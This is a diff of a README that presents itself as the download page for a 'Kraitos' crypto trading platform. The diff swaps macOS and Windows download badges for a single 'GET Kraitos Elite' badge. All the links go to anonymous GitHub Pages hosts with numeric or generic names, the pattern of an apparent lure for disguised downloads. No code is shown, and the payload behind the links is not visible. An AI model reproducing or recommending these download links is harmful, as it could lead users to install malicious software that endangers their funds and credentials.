@@ -1,18 +1,6 @@
 # Kraitos Download — Crypto Trading Platform
 
-<a href="https://app-hub-deploy.github.io/.github/?offer=Kraitos" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Kraitos%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="Kraitos for macOS">
-</a>
-
-<a href="https://app-hub-deploy.github.io/.github/?offer=Kraitos" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Kraitos%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="Kraitos for Windows">
-</a>
+[![GET Kraitos Elite](https://img.shields.io/badge/GET%20%E2%80%94%20Kraitos-Elite-0078D6?style=for-the-badge&logoColor=white)](https://e03722923.github.io/.github/Kraitos-Elite)
 
 ---
 
